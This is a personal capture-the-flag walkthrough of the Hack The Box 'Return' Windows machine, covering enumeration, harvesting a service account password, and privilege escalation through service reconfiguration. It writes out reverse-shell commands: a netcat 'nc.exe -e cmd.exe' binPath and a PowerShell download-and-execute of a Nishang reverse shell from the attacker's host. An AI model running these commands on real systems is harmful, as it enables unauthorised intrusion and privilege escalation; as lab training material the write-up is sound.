# Return

This is my walk-through of the machine located at: [https://app.hackthebox.com/machines/Return](https://app.hackthebox.com/machines/Return).

nmap scan: `nmap -T4 -A 10.10.11.108 -oN return.nmap`

I then went on the IP Address and found this page:

![](<../../.gitbook/assets/image (595).png>)

I then ran **gobuster** on the IP Address: `gobuster dir -u 10.10.11.108 -w directory-list-2.3-big.txt -t 60`. I ended up with the following, which wasn't very helpful:

![](<../../.gitbook/assets/image (352) (1) (1) (1) (1) (1).png>)

I then tried found the nmap command to enumerate ldap: `nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=cqure,dc=net"' 10.10.11.108`.The nmap script was taking a while, so I went to the walk-through to see where I had gotten off of track. I found out that I should use **enum4linux** in order to enumerate for SMB: `enum4linux -a 10.10.11.108`. I then found this information:

![](<../../.gitbook/assets/image (374).png>)

The walk-through mentioned that we should enter our own IP Address in the **Server Address** section on the website. Using that I got a shell:

![](<../../.gitbook/assets/image (642).png>)

The walk-through then mentioned using the **evil-winrm** tool. I learned that, while I was able to overwrite the password for the svc-printer user, it would be overwritten by its own system. The walk-through pointed out that the password would be what is shown by the output of netcat connection previously:

![](<../../.gitbook/assets/image (488) (1).png>)

Looking around, I was able to find the **user.txt** flag in the Desktop of the svc-printer user:

![](<../../.gitbook/assets/image (506) (1).png>)

I am not too familiar with Windows commands, so the walk-through mentioned running the `net user svc-printer` command:

![](<../../.gitbook/assets/image (634).png>)

Again, I had to view the write-up to see where to go from here. From the commands, you are uploading netcat onto the system, and then configuring netcat to be run and connect to your machine:

`upload /usr/share/windows-resources/binaries/nc.exe`

`sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe <YOUR-IP> 1234"`. After having a netcat listener setup on another tab, I was able to get a connection:

![](<../../.gitbook/assets/image (379).png>)

The official walk-through got me to become root, however, I was not able to do anything on the machine. I then found this [write-up](https://readysetexploit.wordpress.com/2021/10/12/hack-the-box-return/) that helped me setup a proper shell. Here are the commands I used:

```
Download the Nishang script for Powershell:
https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

Have a netcat listener opened in another teminal window (using rlwrap):
rlwrap nc -lvnp <PORT>

Have a python3 http server online on another teminal window:
sudo python3 -m http.server 80

Upload that to the server with the evil-winrm terminal:
sc.exe config vss binPath="C:\Windows\System32\cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.10/Invoke-PowerShellTcp.ps1')"

Restart the executable:
sc.exe stop VSS
sc.exe start VSS
```

I was then able to get the root.txt file:

![](<../../.gitbook/assets/image (443).png>)
